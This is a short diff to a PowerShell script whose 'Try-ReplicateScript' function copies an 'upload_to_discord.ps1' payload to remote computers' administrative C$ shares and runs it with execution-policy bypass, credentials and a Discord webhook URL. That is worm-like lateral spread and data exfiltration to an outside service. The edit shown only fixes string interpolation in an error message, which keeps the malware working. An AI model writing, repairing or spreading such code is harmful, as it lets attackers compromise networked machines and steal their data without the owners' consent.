@@ -84,7 +84,7 @@ function Try-ReplicateScript {
                     powershell.exe -ExecutionPolicy Bypass -File $scriptPath
                 } -ArgumentList "\\$computer\C$\Windows\Temp\upload_to_discord.ps1", $webhookUrl -Credential (Get-Credential) -ErrorAction Stop
             } catch {
-                Write-Host "Failed to replicate or execute on $computer: $($_.Exception.Message)"
+                Write-Host "Failed to replicate or execute on ${computer}: $($_.Exception.Message)"
             }
         }
     } catch {
